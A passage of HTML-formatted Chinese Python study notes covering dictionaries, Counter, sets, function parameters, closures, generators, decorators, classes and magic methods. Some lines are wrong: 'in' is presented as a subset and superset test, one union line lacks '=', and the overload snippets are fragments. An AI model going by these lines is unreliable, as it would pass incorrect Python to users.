class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># in 测试的是键是否在字典中 </span></span><br><span class="line">key <span class="keyword">in</span> dicts</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 技巧</span></span><br><span class="line"><span class="comment"># 字典键值互换：</span></span><br><span class="line">dic2 = &#123;value: key <span class="keyword">for</span> key, value <span class="keyword">in</span> dic1.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 键最大的键（返回最大值的键值）</span></span><br><span class="line"><span class="built_in">max</span>( dic ) </span><br><span class="line"><span class="comment"># 值最大的值</span></span><br><span class="line"><span class="built_in">max</span>( dic.values() )</span><br><span class="line"><span class="comment"># 键最大的值</span></span><br><span class="line">dic[ <span class="built_in">max</span>(dic) ]</span><br><span class="line"><span class="comment"># 值最大的键</span></span><br><span class="line"><span class="built_in">max</span>( dic, key=dic.get)</span><br><span class="line"><span class="built_in">max</span>( dic,key=<span class="keyword">lambda</span> x:<span class="built_in">len</span>(dic[x])) <span class="comment"># 列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表变成字典</span></span><br><span class="line">lst = [ [ key,value ] , ... ]</span><br><span class="line">dic = <span class="built_in">dict</span>( lst )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计数器，Counter 中的键为待计数的元素，而 value 值为对应元素出现的次数 count。</span></span><br><span class="line"><span class="comment"># 使用Counter应当 from collections import Counter </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="comment">#  实例化元素为空的 Counter 对象</span></span><br><span class="line">a = Counter()</span><br><span class="line"></span><br><span class="line"><span class="comment">#  从可迭代对象中实例化 Counter 对象</span></span><br><span class="line">b = Counter(<span class="string">&#x27;chenkc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  从 mapping 中实例化 Counter 对象</span></span><br><span class="line">c = Counter(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  从关键词参数中实例化 Counter 对象</span></span><br><span class="line">d = Counter(a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认键类型</span></span><br><span class="line">dic = collections.defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="comment"># 双端队列</span></span><br><span class="line">collections.deque()</span><br></pre></td></tr></table></figure><h3 id="2-集合"><a href="#2-集合" class="headerlink" title="2 集合"></a>2 集合</h3><blockquote><p>数学集合，set()</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在S中移除，不在不报异常</span></span><br><span class="line">S.discard(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在S中移除，不在报KeyError</span></span><br><span class="line">S.remove(x)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 判断S与T中是否存在相同元素，没有为真</span></span><br><span class="line">S.isdisjoint(T)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交集</span></span><br><span class="line">res = set1 &amp; set2</span><br><span class="line">res = set1.intersection(set2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 并集</span></span><br><span class="line">res = set1 | set2</span><br><span class="line">res set1.union(set2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 差集</span></span><br><span class="line">res = set1 - set2</span><br><span class="line">res = set1.difference(set2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补集（对称差集）</span></span><br><span class="line">res = set1 ^ set2</span><br><span class="line">res = set1.symmetric_difference(set2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断 set1 是否是 set2 的子集</span></span><br><span class="line">subset_check = set1 <span class="keyword">in</span> set2</span><br><span class="line">subset_check = set1.issubset(set2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断 set1 是否是 set2 的超集</span></span><br><span class="line">superset_check = set2 <span class="keyword">in</span> set1</span><br><span class="line">superset_check = set1.issuperset(set2)  </span><br></pre></td></tr></table></figure><hr><h2 id="五、函数"><a href="#五、函数" class="headerlink" title="五、函数"></a>五、函数</h2><h3 id="1-变量范围"><a href="#1-变量范围" class="headerlink" title="1 变量范围"></a>1 变量范围</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># global:全局变量，先定义再使用</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">global</span> a</span><br><span class="line">    a = <span class="number">15</span></span><br><span class="line">func()</span><br><span class="line"><span class="built_in">print</span>(a) <span class="comment"># 输出15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nonlocal:非局部变量，可以被函数中的函数使用，先定义再使用，外部函数也要有该变量。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> x</span><br><span class="line">        x = <span class="number">20</span></span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(x) <span class="comment"># 输出20</span></span><br><span class="line">outer()</span><br></pre></td></tr></table></figure><h3 id="2-自定义函数"><a href="#2-自定义函数" class="headerlink" title="2 自定义函数"></a>2 自定义函数</h3><blockquote><p>函数参数：<a href="https://zhuanlan.zhihu.com/p/50804195">args</a></p><p><a href="https://www.cnblogs.com/JIM-FAN/p/12782568.html">字符串方式访问函数</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">funcname</span> (paras:types)-&gt;types :</span><br><span class="line">    statements</span><br><span class="line">    [<span class="keyword">return</span>[expression]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数内部定义函数并在函数内部使用。也可以把内部函数作为返回值返回给外部。（闭包：内部函数使用了外部函数的变量）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_func</span>():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    new_func()</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line"><span class="comment"># 位置参数（依次赋值）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a,b</span>)</span><br><span class="line">test (<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋值参数（直接赋值）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a,b</span>)</span><br><span class="line">test (b=<span class="number">1</span>,a=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认参数（不赋值将使用默认值）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span> (a,b=<span class="number">2</span>)</span><br><span class="line">test (<span class="number">1</span>)</span><br><span class="line"><span class="comment">#默认参数注释为 (b:int=2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可变参数</span></span><br><span class="line"><span class="comment"># 一个星号：输入的多个值以元组保存，输入：1,2,3，注意：此时值直接转化成列表为 [( 1,2,3 )]</span></span><br><span class="line"><span class="comment"># 两个星号：输入的多个值以字典保存，输入：a=5,b=6,c=7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span> ( name, *args , **kwargs ):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串名访问函数</span></span><br><span class="line"><span class="built_in">eval</span>( <span class="built_in">str</span> )()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认参数案例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">a=(<span class="params"></span>),b=[]</span>):</span><br><span class="line">    a += (<span class="number">1</span>,)</span><br><span class="line">    b.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">fun()</span><br><span class="line"><span class="built_in">print</span>(fun())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出：((1,), [1, 1])</span></span><br><span class="line"><span class="string">Python的默认参数只在函数定义时被赋值一次，而不会每次调用函数时又创建新的引用。</span></span><br><span class="line"><span class="string">元组不可修改 所以调用了两次函数，第二次元组初始也是空元组，所以只有一个元素。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭包返回函数案例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fn</span>():</span><br><span class="line">    t = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">2</span>:</span><br><span class="line">        t.append(<span class="keyword">lambda</span> x: <span class="built_in">print</span>(i*x,end=<span class="string">&quot;,&quot;</span>))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> fn():</span><br><span class="line">    f(<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出：4,4, 因为在for的时候fn中的循环先被执行完了，此时i = 2，然后再调用print函数。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-yield"><a href="#3-yield" class="headerlink" title="3 yield"></a>3 yield</h3><blockquote><p>yield 的作用就是把一个函数变成一个 generator。</p><p>在 for 循环执行时，每次循环都会执行 fab 函数内部的代码，执行到 yield b 时，fab 函数就返回一个迭代值。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例（10以内的阶乘）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jie</span>(<span class="params">now</span>):</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, now + <span class="number">1</span>):</span><br><span class="line">        count *= i</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line">        <span class="keyword">yield</span> count</span><br><span class="line">jar = jie(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> jar :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&quot;</span>.<span class="built_in">format</span>(i), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">    i = jar.__next__()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure><h3 id="4-匿名函数"><a href="#4-匿名函数" class="headerlink" title="4 匿名函数"></a>4 匿名函数</h3><p><code>lambda parameters : expression</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按出现次数最多从小到大排序</span></span><br><span class="line">cnt = Counter(barcodes)</span><br><span class="line">barcodes.sort(key=<span class="keyword">lambda</span> x: (-cnt[x], x))</span><br></pre></td></tr></table></figure><h3 id="5-常用函数"><a href="#5-常用函数" class="headerlink" title="5 常用函数"></a>5 常用函数</h3><blockquote><p><a href="https://www.runoob.com/python/python-func-any.html">any()</a>    <a href="https://www.runoob.com/python/python-func-all.html">all()</a> </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数学操作</span></span><br><span class="line"><span class="comment">#返回绝对值</span></span><br><span class="line"><span class="built_in">abs</span>(num)</span><br><span class="line"><span class="comment"># 返回浮点数四舍五入后的值（int()是向下取整）</span></span><br><span class="line"><span class="built_in">round</span>(num)</span><br><span class="line"><span class="comment"># 返回 dividend/divisor 和 dividend%divisor 的元组</span></span><br><span class="line">quotient,remainder = <span class="built_in">divmod</span>( dividend , divisor ) </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转化函数</span></span><br><span class="line"><span class="comment"># int()  str-&gt;int（字符串数字依照base规则转成十进制）</span></span><br><span class="line"><span class="built_in">int</span>(<span class="built_in">str</span>, base=<span class="number">10</span>)  <span class="comment"># str是字符串，base表示进制，默认十进制。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex()  int-&gt;int（十进制转十六进制）</span></span><br><span class="line"><span class="built_in">hex</span>() <span class="comment"># 函数用于将10进制整数转换成16进制，以字符串形式表示。返回 &#x27;0x....&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bin()  int-&gt;int（十进制转二进制）</span></span><br><span class="line"><span class="built_in">bin</span>() <span class="comment"># 返回一个整数 int 或者长整数 long int 的二进制表示。返回 &#x27;0b....&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chr()  int-&gt;ASCII（整型转ASCII码）</span></span><br><span class="line"><span class="built_in">chr</span>() <span class="comment"># 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ord()  ASCII-&gt;int（ASCII码转整型）</span></span><br><span class="line"><span class="built_in">ord</span>() <span class="comment"># 主要用来返回对应字符的 ascii 码</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于判断给定的可迭代参数 iterable 是否全部为 False，则返回 False，如果有一个为 True，则返回 True。</span></span><br><span class="line"><span class="built_in">any</span>(<span class="built_in">iter</span>)</span><br><span class="line"><span class="comment"># 用于判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False。</span></span><br><span class="line"><span class="built_in">all</span>(<span class="built_in">iter</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留满足function条件的iter，返回列表</span></span><br><span class="line"><span class="built_in">filter</span>(function,<span class="built_in">iter</span>)</span><br><span class="line"><span class="comment"># 按function规则累加，init：初值</span></span><br><span class="line">reduce(function,<span class="built_in">iter</span>[,init])</span><br></pre></td></tr></table></figure><h3 id="6-装饰器"><a href="#6-装饰器" class="headerlink" title="6 装饰器"></a>6 装饰器</h3><blockquote><p><a href="https://www.zhihu.com/question/325817179/answer/798679602">装饰器</a></p><p>多个装饰器从下往上调用。</p><p>定义：在函数调用前先调用闭包的函数，参数传递是传给是闭包的函数。</p><p><a href="https://blog.csdn.net/weixin_43646592/article/details/129162138">@cache 装饰器</a>：一种装饰在被执行的函数上，将其执行的结果缓存起来的缓存装饰器。当下次请求的时候，如果请求该函数的传参未变则直接返回缓存起来的结果而不再执行函数。</p><p><a href="https://zhuanlan.zhihu.com/p/64487092">@property</a>：装饰函数后，该函数会变成属性且变为只读，使用时不用带括号，函数没有参数。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Do_Add</span>(<span class="params">ad</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">a,b</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">        c = ad(a,b)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;value:%d&quot;</span>%c)</span><br><span class="line">    <span class="keyword">return</span> Add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用方法1：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ad</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">myfunc = Do_Add(ad)</span><br><span class="line">myfunc(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用方法2：</span></span><br><span class="line"><span class="meta">@Do_Add</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ad</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">ad(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数作为属性且只可读</span></span><br><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数作为属性且只可写</span></span><br><span class="line"><span class="meta">@name.setter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self, value</span>):</span><br><span class="line">    self._name = value</span><br></pre></td></tr></table></figure><hr><h2 id="六、类与对象"><a href="#六、类与对象" class="headerlink" title="六、类与对象"></a>六、类与对象</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><ul><li><p>变量</p><ul><li><p>成员变量：self</p></li><li><p>类变量：方法外定义的变量</p><blockquote><p>类变量可以通过类名加变量名访问，也可以通过对象名加变量名访问。在实例化对象后，若类变量没有修改过值，通过类名加变量名修改类变量值将会同时作用于类和对象。若类变量修改过值，类变量相当于变成了实例变量，通过类名加变量名的方式将不会再修改对象类变量值。后续实例化对象后实例出的类变量值则是实例化最新的变量值。</p></blockquote></li></ul></li><li><p>方法</p><ul><li>成员方法：带参self，可以访问类变量和成员变量，可以用对象名访问。</li><li>普通方法：任意参，可以访问类变量和成员变量，可以用对象名和类名访问。</li><li>类方法：类方法装饰器<code>@classmethod</code>，参数cls，可以访问类变量，可以用对象名和类名访问。</li><li>静态方法：静态方法装饰器<code>@staticmethod</code>，无参，不可以访问类变量和成员变量，可以用对象名和类名访问。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="comment"># 类变量</span></span><br><span class="line">    class_var = <span class="string">&quot;This is a class variable&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, instance_var</span>):</span><br><span class="line">        <span class="comment"># 成员变量</span></span><br><span class="line">        self.instance_var = instance_var</span><br><span class="line"><span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">common_method</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is an common method&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">instance_method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is an instance method&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Accessing instance variable:&quot;</span>, self.instance_var)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Accessing class variable:&quot;</span>, self.class_var)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">class_method</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is a class method&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Accessing class variable:&quot;</span>, cls.class_var)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">static_method</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is a static method&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment"># 类变量案例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">b1 = Base()</span><br><span class="line">b2 = Base()</span><br><span class="line"><span class="comment"># 对象类变量不影响类中类变量</span></span><br><span class="line">b1.count = b1.count + <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(b1.count,<span class="string">&quot; &quot;</span>,Base.count,<span class="string">&quot; &quot;</span>,b2.count)</span><br><span class="line"><span class="comment"># 类变量修改不影响对象的类变量修改过的对象</span></span><br><span class="line">Base.count = Base.count + <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(b1.count,<span class="string">&quot; &quot;</span>,Base.count,<span class="string">&quot; &quot;</span>,b2.count)</span><br><span class="line"><span class="comment"># 对象的类变量修改后通过修改类的类变量的方式将不影响对象的类变量</span></span><br><span class="line">b2.count = b2.count + <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(b1.count,<span class="string">&quot; &quot;</span>,Base.count,<span class="string">&quot; &quot;</span>,b2.count)</span><br><span class="line"></span><br><span class="line">Base.count = Base.count + <span class="number">50</span></span><br><span class="line"><span class="built_in">print</span>(b1.count,<span class="string">&quot; &quot;</span>,Base.count,<span class="string">&quot; &quot;</span>,b2.count)</span><br><span class="line"><span class="comment"># 新实例化的对象是新的类的类变量值</span></span><br><span class="line">b3 = Base()</span><br><span class="line"><span class="built_in">print</span>(b1.count,<span class="string">&quot; &quot;</span>,Base.count,<span class="string">&quot; &quot;</span>,b2.count,<span class="string">&quot; &quot;</span>,b3.count)</span><br></pre></td></tr></table></figure><h3 id="2-方法参数"><a href="#2-方法参数" class="headerlink" title="2 方法参数"></a>2 方法参数</h3><blockquote><p>对象：self</p><p>类：<a href="https://www.cnblogs.com/wayne-tou/p/11896706.html">cls的使用</a></p><p>私有参数：<code>__name</code></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># self</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.age = <span class="number">6</span></span><br><span class="line">       </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_print</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.age)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment"># cls</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">cls, name</span>):</span><br><span class="line">        obj = cls(name)</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Name:&quot;</span>, self.name)</span><br><span class="line"></span><br><span class="line">my_obj = MyClass.create(<span class="string">&quot;Alice&quot;</span>)</span><br><span class="line">my_obj.display()  <span class="comment"># 输出: Name: Alice</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># python的私有参数强制访问（object._calss__variable）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__name = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">new = NewClass()</span><br><span class="line"><span class="built_in">print</span>(new._NewClass__name)</span><br></pre></td></tr></table></figure><h3 id="3-高级特效"><a href="#3-高级特效" class="headerlink" title="3 高级特效"></a>3 高级特效</h3><blockquote><p>继承父类：单个子类不存在就继承，多个从前向后继承，前有则继承前父类。</p><p><code>super().father_function()</code>调用父类方法</p><p>方法重写：子类重写和父类同名同参的方法后，系统在调用时将调用子类重写后的方法。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 继承和重写</span></span><br><span class="line"><span class="comment"># 父类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> is making a sound.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, breed</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line">        self.breed = breed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> is barking.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建父类对象</span></span><br><span class="line">animal = Animal(<span class="string">&quot;Generic Animal&quot;</span>)</span><br><span class="line">animal.speak()  <span class="comment"># 输出: Generic Animal is making a sound.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建子类对象</span></span><br><span class="line">dog = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="string">&quot;Labrador&quot;</span>)</span><br><span class="line">dog.speak()  <span class="comment"># 输出: Buddy is barking.</span></span><br></pre></td></tr></table></figure><h3 id="4-魔法方法"><a href="#4-魔法方法" class="headerlink" title="4 魔法方法"></a>4 魔法方法</h3><blockquote><p><code>__new__</code>是一个类级别方法（classmethod），它在对象实例化之前被调用。它负责创建并返回实例对象，在实例化过程中是第一个被调用的方法。它的主要作用是控制对象的创建过程。</p><p><code>__init__</code>是一个实例级别方法（instancemethod），它在对象实例化之后被调用。它用于初始化实例的属性，并在对象创建后进行额外的设置。</p><p>对于new和init区别：</p><p><strong>new</strong>是一个静态方法，而<strong>init</strong>是一个实例方法</p><p><strong>new</strong>方法会返回一个创建的实例，而<strong>init</strong>什么都不返回</p><p>只有在<strong>new</strong>返回一个cls的实例时，后面的<strong>init</strong>才能被调用</p><p>当创建一个新实例时调用<strong>new</strong>，初始化一个实例时用<strong>init</strong></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Creating instance using __new__&quot;</span>)</span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Initializing instance using __init__&quot;</span>)</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">obj = MyClass(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="5-重载"><a href="#5-重载" class="headerlink" title="5 重载"></a>5 重载</h3><blockquote><p>类的重载：<a href="https://juejin.cn/post/7113923725333889054">overload</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 类函数重载</span></span><br><span class="line"><span class="comment"># 类初始化重载</span></span><br><span class="line"><span class="meta">@typing.overload</span></span><br><span class="line">__init__(): <span class="comment">#靠参数注释区分</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类方法重载</span></span><br><span class="line"><span class="meta">@overload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(): <span class="comment">#靠参数注释区分</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 类方法重载</span></span><br><span class="line"><span class="comment">#加减乘除余</span></span><br><span class="line">__add__</span><br><span class="line">__sub__</span><br><span class="line">__mul__</span><br><span class="line">__div__</span><br><span class="line">__mod__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印或转化 print()、repr()、str()</span></span><br><span class="line">__repr__、__str__ </span><br><span class="line"><span class="comment"># 索引获取</span></span><br><span class="line">__getitem__</span><br><span class="line"><span class="comment"># 索引赋值</span></span><br><span class="line">__setitem__</span><br><span class="line"><span class="comment"># 删除索引和分片</span></span><br><span class="line">__delitem__</span><br><span class="line"><span class="comment"># key in map</span></span><br><span class="line">__contains__</span><br><span class="line"><span class="comment"># 获得长度</span></span><br><span class="line">__len__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等于/不等于</span></span><br><span class="line">__eq__、__ne__</span><br><span class="line"><span class="comment"># 小于/小于等于</span></span><br><span class="line">__lt__、__le__</span><br><span class="line"><span class="comment"># 大于/大于等于</span></span><br><span class="line">__gt__、__ge__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可迭代（return self.iter.__iter__()，可用 for 依次取出）</span></span><br><span class="line">__iter__</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span 